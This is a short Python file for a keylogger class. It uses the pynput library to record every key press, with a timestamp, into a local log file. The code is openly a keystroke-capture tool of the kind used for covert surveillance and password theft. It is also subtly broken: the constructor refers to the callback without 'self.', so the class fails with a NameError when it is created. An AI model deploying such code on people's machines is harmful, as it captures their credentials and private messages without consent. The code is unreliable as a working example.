from pynput.keyboard import Key, Listener
import logging

class KeyLogger:
    """
    Logs key presses to a file
    """

    def __init__(self, keylog_filename: str) -> None:
        """
        Constructor

        :param keylog_filename: The name of the file to store the keylogs
        """

        self.keylog_filename = keylog_filename
        
        self.listener = Listener(on_press=_keypress_callback)

        logging.basicConfig(filename=(self.keylog_filename), level=logging.DEBUG, format='%(asctime)s: %(message)s')



    def _keypress_callback(self, key: Key) -> None:
        """
        Callback function for each keypress

        :param key: Key pressed
        """
        
        logging.info(str(key))


    def start_log(self) -> None:
        """
        Starts logging key presses
        """

        self.listener.start()
